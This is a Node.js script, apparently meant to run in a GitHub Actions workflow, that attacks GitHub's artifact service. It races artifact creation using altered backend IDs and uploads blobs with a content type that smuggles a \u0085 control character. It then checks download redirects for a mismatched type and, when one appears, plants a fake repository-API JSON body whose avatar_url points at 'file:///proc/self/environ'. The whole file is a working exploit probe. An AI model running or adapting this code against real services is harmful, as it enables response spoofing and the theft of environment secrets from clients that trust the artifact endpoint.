import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const canonical = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const weird = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"placeholder"}');
const repositoryName = process.env.GITHUB_REPOSITORY;

function bodyFor(id) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${id}/zip`,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette backend alias probe',
    stargazers_count: 0,
  }));
}

function variant(kind) {
  const result = { ...canonical };
  if (kind.includes('run')) result.workflowRunBackendId = result.workflowRunBackendId.toUpperCase();
  if (kind.includes('job')) result.workflowJobRunBackendId = result.workflowJobRunBackendId.toUpperCase();
  if (kind === 'compact-job') result.workflowJobRunBackendId = result.workflowJobRunBackendId.replaceAll('-', '');
  if (kind === 'braced-job') result.workflowJobRunBackendId = `{${result.workflowJobRunBackendId}}`;
  return result;
}

async function create(name, ids, version, mime) {
  return client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, version,
    mimeType: StringValue.create({ value: mime }),
  });
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}

async function finalize(name, ids, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, size: String(bytes.length),
    hash: StringValue.create({ value: `sha256:${hash}` }),
  });
  return String(result.artifactId);
}

async function inspect(id) {
  const endpoint = `https://api.github.com/repos/${repositoryName}/actions/artifacts/${id}/zip`;
  const response = await fetch(endpoint, {
    redirect: 'manual',
    headers: { Authorization: `Bearer ${process.env.GH_TOKEN}`,
      Accept: 'application/vnd.github.v3+json', 'User-Agent': 'repo-cassette-alias-probe' },
  });
  if (response.status !== 302) return { id, status: response.status };
  const location = response.headers.get('location');
  const rsct = new URL(location).searchParams.get('rsct');
  if (rsct === 'application/json' || rsct === 'application/zip') return { id, status: 302, rsct };
  const raw = await fetch(location);
  return { id, status: raw.status, rsct, contentType: raw.headers.get('content-type') };
}

for (const kind of ['run', 'job', 'run-job', 'compact-job', 'braced-job']) {
  for (let reverse = 0; reverse < 2; reverse += 1) {
    const name = `cassette-alias-${kind}-${reverse}-${Date.now()}`;
    const choices = reverse
      ? [[canonical, 7, 'application/json'], [variant(kind), 6, weird]]
      : [[variant(kind), 6, weird], [canonical, 7, 'application/json']];
    try {
      const results = await Promise.allSettled(choices.map(([ids, version, mime]) => create(name, ids, version, mime)));
      if (results.some(item => item.status === 'rejected' || !item.value?.ok)) {
        console.log(`REJECT ${kind} reverse=${reverse} ${results.map(item => item.status === 'fulfilled' ? String(item.value?.ok) : String(item.reason?.message).slice(0, 150)).join(' | ')}`);
        continue;
      }
      const created = results.map(item => item.value);
      await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));
      const finalized = await Promise.allSettled(choices.map(([ids]) => finalize(name, ids, placeholder)));
      const artifactIds = [...new Set(finalized.filter(item => item.status === 'fulfilled').map(item => item.value))];
      const reps = await Promise.all(artifactIds.map(inspect));
      console.log(`RESULT ${JSON.stringify({ kind, reverse, artifactIds, reps })}`);
      const mixed = reps.find(item => item.contentType?.includes('\u0085'));
      if (mixed) {
        const bytes = bodyFor(mixed.id);
        await Promise.all(created.map(item => upload(item.signedUploadUrl, bytes)));
        console.log(`MIXED ${JSON.stringify({ artifactId: mixed.id, contentType: mixed.contentType, repository: `${repositoryName}/actions/artifacts/${mixed.id}/zip` })}`);
      }
    } catch (error) {
      console.log(`SKIP ${kind} reverse=${reverse} ${String(error.message).slice(0, 200)}`);
    }
  }
}
